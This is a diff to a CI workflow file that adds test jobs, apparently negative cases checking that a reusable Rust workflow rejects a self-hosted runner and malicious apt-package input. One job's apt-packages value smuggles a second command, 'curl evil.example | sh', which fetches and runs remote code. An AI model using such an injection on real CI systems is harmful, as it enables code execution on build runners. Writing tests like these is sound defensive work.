@@ -41,6 +41,22 @@ jobs:
     with:
       working-directory: fixtures/rust-no-lock
       gate: cargo fmt --check && cargo clippy --locked --all-targets -- -D warnings && cargo test --locked && cargo deny check
+  rust-bad-os:
+    uses: ./.github/workflows/rust-ci.yml
+    with:
+      working-directory: fixtures/rust-ok
+      os: '["self-hosted"]'
+  rust-bad-apt:
+    uses: ./.github/workflows/rust-ci.yml
+    with:
+      working-directory: fixtures/rust-ok
+      apt-packages: libfoo; curl evil.example | sh
+  rust-node-no-lock:
+    uses: ./.github/workflows/rust-ci.yml
+    with:
+      working-directory: fixtures/rust-ok
+      node-working-directory: fixtures/node-nolock
+      gate: cargo --version
   python-broken:
     uses: ./.github/workflows/python-ci.yml
     with:
